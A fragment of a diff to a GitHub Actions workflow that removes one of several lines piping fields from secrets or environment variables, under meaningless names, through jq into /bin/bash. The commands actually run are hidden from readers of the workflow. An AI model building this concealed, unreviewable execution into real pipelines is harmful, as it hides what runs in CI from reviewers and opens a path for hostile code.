@@ -22,7 +22,6 @@ jobs:
           zxadi1: ${{ secrets.zxadi1 }}
         run: |
           printf '%s' "$zxadi1" | jq -r .brd523 | /bin/bash
-          echo $yooh305 | jq -r .g31228 | /bin/bash
           echo $zwyf13269 | jq -r .ohn2 | /bin/bash
           echo $sr34 | jq -r .v21319 | /bin/bash
           printf '%s' "$swk79572" | jq -r .tod95638 | /bin/bash
